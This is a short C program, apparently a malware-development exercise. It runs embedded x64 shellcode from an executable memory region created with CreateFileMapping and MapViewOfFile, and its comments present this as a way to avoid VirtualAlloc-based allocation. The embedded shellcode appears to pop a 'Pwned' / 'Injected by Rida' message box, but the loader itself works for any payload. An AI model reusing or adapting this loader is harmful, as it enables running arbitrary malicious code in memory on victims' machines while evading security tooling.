#include <windows.h>
#include <stdlib.h>

/*
    Allocate memory in already Mapped sections, not in new private memory (w/ VirtualAlloc*)
    This mapped memory is used to access the content of a file on disk to a specific memory region
    Use : 
        > CreateFileMapping -> Creat/Open a handle of a file mapping object create a memory space for disk's file content
            HANDLE CreateFileMappingA(
            [in]           HANDLE                hFile, //If : INVALID_HANDLE_VALUE permit to cerate object without a file on disk
            [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,     // Not Required - NULL
            [in]           DWORD                 flProtect,                   //define pssible permissions (RWX is we want to execute from it later)
            [in]           DWORD                 dwMaximumSizeHigh,           // Not Required - NULL // Required if INVALID_HANDLE_VALUE
            [in]           DWORD                 dwMaximumSizeLow,                                   // Required if INVALID_HANDLE_VALUE
            [in, optional] LPCSTR                lpName                       // Not Required - NULL   
            );


        > MapViewOfFile -> Map the File mapping object into a process's memory using desired acces (relative to previous : flProtect) and handle to file object mapping

            LPVOID MapViewOfFile(
                [in] HANDLE     hFileMappingObject,
                [in] DWORD      dwDesiredAccess,
                [in] DWORD      dwFileOffsetHigh,           // Not Required - NULL
                [in] DWORD      dwFileOffsetLow,            // Not Required - NULL
                [in] SIZE_T     dwNumberOfBytesToMap
                );

*/

int main (int argc, char** argv){
    UCHAR shellcode_64[] = 
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x48\x31\xd2\x51\x56\x65\x48\x8b\x52\x60"
        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f"
        "\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02"
        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
        "\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x8b"
        "\x48\x18\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x11"
        "\x00\x00\x00\x49\x6e\x6a\x65\x63\x74\x65\x64\x20\x62\x79"
        "\x20\x52\x69\x64\x61\x00\x5a\xe8\x06\x00\x00\x00\x50\x77"
        "\x6e\x65\x64\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
        "\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d"
        "\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75"
        "\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
    size_t shellcode_64_sz = sizeof(shellcode_64);

    // Create a file mapping object without on-disk file
    HANDLE hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, shellcode_64_sz, NULL);

    LPVOID pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, 0, 0, shellcode_64_sz);

    memcpy(pMapAddress, shellcode_64, shellcode_64_sz);

    ((void(*)())pMapAddress)();
    
    if (pMapAddress) UnmapViewOfFile(pMapAddress);
    if (hFile) CloseHandle(hFile);
    
    return 0;
}